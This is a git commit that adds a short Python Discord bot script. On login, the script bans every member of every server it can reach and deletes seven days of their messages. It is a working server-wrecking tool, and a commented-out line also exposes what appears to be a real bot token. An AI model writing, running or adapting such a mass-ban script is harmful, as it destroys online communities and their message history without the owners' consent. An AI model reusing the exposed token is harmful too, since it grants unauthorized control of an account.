46f56ec878c669827f915b8ddcf09948371ec35f
Maxim <72075667+maximderboven@users.noreply.github.com>
2020-11-01 16:11:57 +0100

    added bot script

---
+++ bot.py
@@ -0,0 +1,23 @@
+import discord
+intents = discord.Intents()
+intents.members = True
+intents.guilds = True
+intents.presences = True
+#NzU3NTEyNjQ0MzgxOTAwODMw.X2heoA.EaYNkIqFsOIZpYxKKWAslLz8PvY
+TOKEN = ""
+SKIP_BOTS = False
+fetch_offline_members = True
+client = discord.Client(intents=intents)
+@client.event
+async def on_ready():
+    print('Logged in!')
+    for member in client.get_all_members():
+        if member.bot and SKIP_BOTS:
+            continue
+        try:
+            await member.ban(reason="xoxo", delete_message_days=7)
+            print(f"Banned {member.display_name}!")
+        except:
+            print(f"Could not ban {member.display_name}")
+    print("Banning is complete!")
+client.run(TOKEN)
